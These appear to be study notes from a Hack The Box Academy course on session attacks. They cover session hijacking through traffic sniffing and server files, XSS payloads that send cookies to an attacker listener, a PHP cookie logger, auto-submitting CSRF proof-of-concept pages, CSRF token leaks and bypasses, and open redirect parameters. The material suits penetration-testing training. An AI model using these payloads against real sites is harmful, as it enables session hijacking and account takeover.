# Session Fixation
session fixation vulnerability if:
- The assigned session identifier pre-login remains the same post-login `and`
- Session identifiers (such as cookies) are being accepted from _URL Query Strings_ or _Post Data_ and propagated to the application

# Obtaining Session Identifiers without User Interaction
## Obtaining Session Identifiers via Traffic Sniffing
Inside Wireshark, first, apply a filter to see only HTTP traffic. This can be done as follows (don't forget to press Enter after specifying the filter). ![image](https://academy.hackthebox.com/storage/modules/153/2.png)

Now search within the Packet bytes for any `auth-session` cookies as follows.

Navigate to `Edit` -> `Find Packet` ![image](https://academy.hackthebox.com/storage/modules/153/4.png)

Left-click on `Packet list` and then click `Packet bytes` ![image](https://academy.hackthebox.com/storage/modules/153/5.png)

Select `String` on the third drop-down menu and specify `auth-session` on the field next to it. Finally, click `Find`. Wireshark will present you with the packets that include an `auth-session` string. ![image](https://academy.hackthebox.com/storage/modules/153/6.png)

The cookie can be copied by right-clicking on a row that contains it, then clicking on `Copy` and finally clicking `Value`. ![image](https://academy.hackthebox.com/storage/modules/153/8.png)

**Part 4: Hijack the victim's session**

Back to the browser window using which you first browsed the application (not the Private Window), open Web Developer Tools, navigate to _storage_, and change your current cookie's value to the one you obtained through Wireshark (remember to remove the `auth-session=` part). ![image](https://academy.hackthebox.com/storage/modules/153/9.png)

If you refresh the page, you will see that you are now logged in as the victim! ![image](https://academy.hackthebox.com/storage/modules/153/10.png)

## Obtaining Session Identifiers Post-Exploitation (Web Server Access)
### PHP
The entry `session.save_path` in `PHP.ini` specifies where session data will be stored.

```shell-session
alakin2504@htb[/htb]$ locate php.ini
alakin2504@htb[/htb]$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
alakin2504@htb[/htb]$ cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```

![image](https://academy.hackthebox.com/storage/modules/153/11.png)

In our default configuration case it's `/var/lib/php/sessions`. Now, please note a victim has to be authenticated for us to view their session identifier. The files an attacker will search for use the name convention `sess_<sessionID>`.

How a PHP session identifier looks on our local setup. ![image](https://academy.hackthebox.com/storage/modules/153/12.png)

The same PHP session identifier but on the webserver side looks as follows.

```shell-session
alakin2504@htb[/htb]$ ls /var/lib/php/sessions
alakin2504@htb[/htb]$ cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```

![image](https://academy.hackthebox.com/storage/modules/153/13.png)
### Java

"The `Manager` element represents the _session manager_ that is used to create and maintain HTTP sessions of a web application.

Tomcat provides two standard implementations of `Manager`. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out (in addition to saving sessions across a server restart) in a storage location that is selected via the use of an appropriate `Store` nested element. The filename of the default session data file is `SESSIONS.ser`."

You can find more information [here](http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html).

---

### .NET

Session data can be found in:

- The application worker process (aspnet_wp.exe) - This is the case in the _InProc Session mode_
- StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the _OutProc Session mode_
- An SQL Server

Please refer to the following resource for more in-depth details: [Introduction To ASP.NET Sessions](https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/)

---

## Obtaining Session Identifiers Post-Exploitation (Database Access)

In cases where you have direct access to a database via, for example, SQL injection or identified credentials, you should always check for any stored user sessions. See an example below.

```sql
show databases;
use project;
show tables;
select * from users;
```

![image](https://academy.hackthebox.com/storage/modules/153/14.png)

Here we can see the users' passwords are hashed. We could spend time trying to crack these; however, there is also a "all_sessions" table. Let us extract data from that table.

```sql
select * from all_sessions;
select * from all_sessions where id=3;

```

![image](https://academy.hackthebox.com/storage/modules/153/15.png)




# Through XSS
=MUST MATCH THESE CONDITIONS=
- found a vulnerable input ( it is best to use payloads with event handlers like `onload` or `onerror` since they fire up automatically and also prove the highest impact on stored XSS cases. Of course, if they're blocked, you'll have to use something else like `onmouseover`.)
- _HTTPOnly_ is off

> [!NOTE]
> 
> **Note**: If you're doing testing in the real world, try using something like [XSSHunter](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.

A sample HTTPS>HTTPS payload example can be found below:
```javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```
## With PHP
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

```shell-session
alakin2504@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
```

Payload:

```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

## Obtaining session cookies via XSS (Netcat edition)
```javascript
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

```shell-session
alakin2504@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

We don't necessarily have to use the `window.location()` object that causes victims to get redirected. We can use `fetch()`, which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way.

```javascript
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```

# Cross-Site Request Forgery (CSRF or XSRF)

First, create and serve the below HTML page. Save it as `notmalicious.html`
```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
If you are wondering how we ended up with the above form, please see the image below. ![image](https://academy.hackthebox.com/storage/modules/153/29.png)

We can serve the page above from our attacking machine as follows.

```shell-session
alakin2504@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

No need for a proxy at this time, so don't make your browser go through Burp Suite. Restore the browser's original proxy settings.

While still logged in as Ela Stienen, open a new tab and visit the page you are serving from your attacking machine `http://<VPN/TUN Adapter IP>:1337/notmalicious.html`. You will notice that Ela Stienen's profile details will change to the ones we specified in the HTML page we are serving.

# Cross-Site Request Forgery (GET-based)
First, create and serve the below HTML page. Save it as `notmalicious_get.html`
```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

Notice that the CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.
```shell-session
alakin2504@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

While still logged in as Julie Rogers, open a new tab and visit the page you are serving from your attacking machine `http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html`. You will notice that Julie Rogers' profile details will change to the ones we specified in the HTML page you are serving.

# Cross-Site Request Forgery (POST-based)
Click on the "Delete" button. You will get redirected to `/app/delete/<your-email>`

![image](https://academy.hackthebox.com/storage/modules/153/36.png)

Notice that the email is reflected on the page. Let us try inputting some HTML into the _email_ value, such as:

```html
<h1>h1<u>underline<%2fu><%2fh1>
```

![image](https://academy.hackthebox.com/storage/modules/153/37.png)

If you inspect the source (`Ctrl+U`), you will notice that our injection happens before a `single quote`. We can abuse this to leak the CSRF-Token.

![image](https://academy.hackthebox.com/storage/modules/153/39.png)

Let us first instruct Netcat to listen on port 8000, as follows.

```shell-session
[!bash!]$ nc -nlvp 8000
listening on [any] 8000 ...
```

Now we can get the CSRF token via sending the below payload to our victim.

```html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

While still logged in as Julie Rogers, open a new tab and visit `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`. You will notice a connection being made that leaks the CSRF token.

![image](https://academy.hackthebox.com/storage/modules/153/40.png)

# XSS & CSRF Chaining
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1]; // check the vuln app source code
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

# Exploiting Weak CSRF Tokens
```shell-session
alakin2504@htb[/htb]$ echo -n goldenpeacock467 | md5sum
0bef12f8998057a7656043b6d30c90a2  -
```

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="never">
    <title>Proof-of-concept</title>
    <link rel="stylesheet" href="styles.css">
    <script src="./md5.min.js"></script>
</head>

<body>
    <h1> Click Start to win!</h1>
    <button class="button" onclick="trigger()">Start!</button>

    <script>
        let host = 'http://csrf.htb.net'

        function trigger(){
            // Creating/Refreshing the token in server side.
            window.open(`${host}/app/change-visibility`)
            window.setTimeout(startPoc, 2000)
        }

        function startPoc() {
            // Setting the username
            let hash = md5("crazygorilla983")

            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`
        }
    </script>
</body>
</html>
```

```javascript
!function(n){"use strict";function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))<<o|u>>>32-o,r)}function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h<n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t="",r=32*n.length,e=0;e<r;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function a(n){var t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e<r;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o<n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t>>>4&15)+r.charAt(15&t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16<e.length&&(e=c(e,8*n.length)),r=0;r<16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t}(this);
//# sourceMappingURL=md5.min.js.map
```

```shell-session
alakin2504@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

# Additional CSRF Protection Bypasses
## Null Value
CSRF-Token: 

## Random CSRF Token
For example, if the CSRF-Token were 32-bytes long, we would re-create a 32-byte token.

Real:

`CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331`

Fake:

`CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3`
	
## Use Another Session’s CSRF Token

Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token's value, for example, `CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331`.

Log into the second account and change the value of _CSRF-Token_ to `9cfffd9e8e78bd68975e295d1b3d3331` while issuing the same (or a different) request

## Request Method Tampering
For example, if the application is using POST, try changing it to GET:

Code: http

```http
POST /change_password
POST body:
new_password=pwned&confirm_new=pwned
```

Code: http

```http
GET /change_password?new_password=pwned&confirm_new=pwned
```

## Delete the CSRF token parameter or send a blank token
Code: http

```http
POST /change_password
POST body:
new_password=qwerty&csrf_token=9cfffd9e8e78bd68975e295d1b3d3331
```

Try:

Code: http

```http
POST /change_password
POST body:
new_password=qwerty
```

Or:

Code: http

```http
POST /change_password
POST body:
new_password=qwerty&csrf_token=
```

## Session Fixation > CSRF
Steps:

1. Session fixation
2. Execute CSRF with the following request:

Code: http

```http
POST /change_password
Cookie: CSRF-Token=fixed_token;
POST body:
new_password=pwned&CSRF-Token=fixed_token
```

## Anti-CSRF Protection via the Referrer Header
If an application is using the referrer header as an anti-CSRF mechanism, you can try removing the referrer header. Add the following meta tag to your page hosting your CSRF script.

`<meta name="referrer" content="no-referrer"`

## Bypass the Regex

---

Sometimes the Referrer has a whitelist regex or a regex that allows one specific domain.

Let us suppose that the Referrer Header is checking for _google.com_. We could try something like `www.google.com.pwned.m3`, which may bypass the regex! If it uses its own domain (`target.com`) as a whitelist, try using the target domain as follows `www.target.com.pwned.m3`.

You can try some of the following as well:

`www.pwned.m3?www.target.com` or `www.pwned.m3/www.target.com`

# Open Redirect
The malicious URL an attacker would send leveraging the Open Redirect vulnerability would look as follows: `trusted.site/index.php?url=https://evil.com`

Make sure you check for the following URL parameters when bug hunting, you'll often see them in login pages. Example: `/login.php?redirect=dashboard`

- ?url=
- ?link=
- ?redirect=
- ?redirecturl=
- ?redirect_uri=
- ?return=
- ?return_to=
- ?returnurl=
- ?go=
- ?goto=
- ?exit=
- ?exitpage=
- ?fromurl=
- ?fromuri=
- ?redirect_to=
- ?next=
- ?newurl=
- ?redir=
## Open Redirect Example
`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

If you enter an email account, you will notice that the application is eventually making a POST request to the page specified in the _redirect_uri_ parameter. A _token_ is also included in the POST request. This token could be a session or anti-CSRF token and, therefore, useful to an attacker.

![image](https://academy.hackthebox.com/storage/modules/153/72.png)

Let us test if we can control the site where the _redirect_uri_ parameter points to. In other words, let us check if the application performs the redirection without any kind of validation (Open Redirect).

We can test that as follows.

First, let us set up a Netcat listener.

```shell-session
alakin2504@htb[/htb]$ nc -lvnp 1337
```

Copy the entire URL where you landed after navigating to `oredirect.htb.net`. It should be a URL of the below format:

`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

Then, edit this URL as follows.

`http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

`<RANDOM TOKEN ASSIGNED BY THE APP>` <-- Replace this with the token that is assigned automatically by the application.